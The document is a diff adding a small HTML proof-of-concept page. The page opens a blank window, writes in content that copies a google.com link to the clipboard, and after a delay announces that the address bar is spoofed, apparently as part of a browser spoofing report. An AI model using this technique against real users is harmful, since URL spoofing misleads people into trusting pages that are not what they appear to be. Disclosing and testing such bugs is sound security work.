@@ -1,0 +1,36 @@
+
+<button onclick="spoof()">Test</button>
+
+<script>
+function spoof() {
+    const win = window.open("about:blank", "_blank");
+
+    win.document.write(`
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+</head>
+<body>
+
+<h1>Click "Copy" Button + Search To Redirect Google</h1>
+
+<button onclick="copyLink()">Copy The Link</button>
+
+<script>
+function copyLink() {
+    navigator.clipboard.writeText("https://google.com");
+
+    setTimeout(() => {
+        document.body.innerHTML = "<h1>Address Bar Spoofed. This is not google.com.</h1>";
+    }, 4000);
+}
+<\/script>
+
+</body>
+</html>
+    `);
+
+    win.document.close();
+}
+</script>
